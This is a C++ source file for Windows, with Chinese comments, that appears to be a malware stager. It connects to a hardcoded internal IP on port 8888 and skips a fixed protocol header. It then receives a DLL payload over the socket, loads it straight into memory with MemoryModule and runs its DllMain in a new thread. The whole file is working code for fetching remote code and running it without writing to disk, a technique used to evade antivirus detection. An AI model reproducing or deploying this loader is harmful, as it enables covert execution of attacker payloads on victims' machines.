#include <WinSock2.h>
#include <Windows.h>
#include <stdio.h>
#include "MemoryModule.h"
#pragma comment(lib,"ws2_32.lib")

#define PAYLOAD_SIZE 1024*512
typedef BOOL(*Module)(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved);

typedef VOID(*msg)(VOID);
PBYTE bFileBuffer = NULL;



BOOL GetPEDLL() {

	DWORD dwError;
	WORD sockVersion = MAKEWORD(2, 2);
	WSADATA wsaData;
	SOCKET socks;
	SHORT sListenPort = 8888;
	struct sockaddr_in sin;

	if (WSAStartup(sockVersion, &wsaData) != 0)
	{
		dwError = GetLastError();
		printf("[*]WSAStarup Error : %d \n", dwError);
		return FALSE;
	}

	socks = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	if (socks == INVALID_SOCKET)
	{
		dwError = GetLastError();
		printf("[*]Socket Error : %d \n", dwError);
		return FALSE;
	}

	sin.sin_family = AF_INET;
	sin.sin_port = htons(sListenPort);
	sin.sin_addr.S_un.S_addr = inet_addr("172.16.250.1");


	if (connect(socks, (struct sockaddr*)&sin, sizeof(sin)) == SOCKET_ERROR)
	{
		dwError = GetLastError();
		printf("[*]Bind Error : %d \n", dwError);
		return FALSE;
	}

	int ret = 0;
	ZeroMemory(bFileBuffer, PAYLOAD_SIZE);
	ret = recv(socks, (PCHAR)bFileBuffer, 1, NULL);
	ret = recv(socks, (PCHAR)bFileBuffer, 1, NULL);
	ret = recv(socks, (PCHAR)bFileBuffer, 1, NULL);
	ret = recv(socks, (PCHAR)bFileBuffer, 1, NULL);
	ret = recv(socks, (PCHAR)bFileBuffer, 2650, NULL);
	ZeroMemory(bFileBuffer, PAYLOAD_SIZE);


	//传送四个数据还有\x00分隔符
	ret = recv(socks, (PCHAR)bFileBuffer,5, NULL); 


	//传送LibraryName还有\x00分隔符，由于我将LibraryName设置为了Micro.dll，有9个字符，需要九个字节来传输，再加上一个分隔符就是十个字节。
	ret = recv(socks, (PCHAR)bFileBuffer,10, NULL);
	ZeroMemory(bFileBuffer, PAYLOAD_SIZE);
	ret = recv(socks, (PCHAR)bFileBuffer, 8704, NULL);

	if (ret > 0)
	{
		closesocket(socks);
	}


	return TRUE;
}

int main()
{

	HMEMORYMODULE hModule;
	Module DllMain;
	bFileBuffer = new BYTE[PAYLOAD_SIZE];
	GetPEDLL();
	// 导入PE文件
	hModule = MemoryLoadLibrary(bFileBuffer, 8704);
	// 如果加载失败，就退出
	if (hModule == NULL) {
		delete[] bFileBuffer;
		return -1;
	}
	// 获取msg导出函数地址
	DllMain = (Module)MemoryGetProcAddress(hModule, "DllMain");
	// 运行msg函数
	DllMain(0, 0, 0);
	// 释放资源
	DWORD dwThread;
	HANDLE hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)DllMain, NULL, NULL, &dwThread);

	WaitForSingleObject(hThread, INFINITE);

	MemoryFreeLibrary(hModule);
	// 释放PE内存
	delete[] bFileBuffer;
	return GetLastError();
}
